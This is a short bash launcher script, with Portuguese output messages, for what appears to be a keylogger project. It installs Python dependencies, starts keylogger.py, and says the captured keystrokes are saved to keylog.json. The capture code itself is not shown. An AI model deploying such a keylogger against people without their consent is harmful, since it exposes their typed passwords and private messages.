#!/bin/bash

GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m' # No Color

cleanup() {
    echo -e "\n${GREEN}Keylogger finalizado com sucesso!${NC}"
    echo -e "${GREEN}Os dados foram salvos em keylog.json${NC}"
    exit 0
}

if ! command -v python3 &> /dev/null; then
    echo -e "${RED}Python 3 não está instalado. Por favor, instale o Python 3 primeiro.${NC}"
    exit 1
fi

echo "Verificando dependências..."
pip3 install -r requirements.txt

clear

echo -e "${GREEN}Iniciando o Keylogger...${NC}"
echo -e "${GREEN}Pressione F12 para finalizar${NC}"
echo "----------------------------------------"

python3 keylogger.py 